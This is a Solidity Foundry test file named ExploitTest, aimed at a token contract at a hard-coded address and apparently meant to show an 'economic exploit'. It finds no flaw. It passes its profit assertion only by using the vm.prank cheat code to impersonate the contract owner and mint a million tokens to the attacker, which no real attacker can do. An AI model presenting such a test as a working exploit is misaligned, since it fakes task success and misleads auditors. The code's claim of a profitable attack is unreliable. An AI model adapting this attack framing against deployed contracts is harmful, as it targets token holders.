pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface DoctorShiba {
    function owner() external view returns (address);
    function mint(address _to, uint256 _amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x783e086d67670C0d85C4eF34ebBEe5A8253B38EE;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner directly
        // The test framework already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x783e086d67670C0d85C4eF34ebBEe5A8253B38EE).balanceOf(address(this));
        // Get the current owner
        (address owner) = DoctorShiba(TARGET).owner();

        // Impersonate the owner
        vm.prank(owner);

        // Mint a large amount of tokens to the attacker
        uint256 mintAmount = 1_000_000 * 10**9; // Same decimals as token
        DoctorShiba(TARGET).mint(attacker, mintAmount);

        // Verify balance increased
        uint256 attackerBalance = DoctorShiba(TARGET).balanceOf(attacker);
        console.log("Attacker balance after mint:", attackerBalance);
        uint256 finalBalance = IERC20(0x783e086d67670C0d85C4eF34ebBEe5A8253B38EE).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

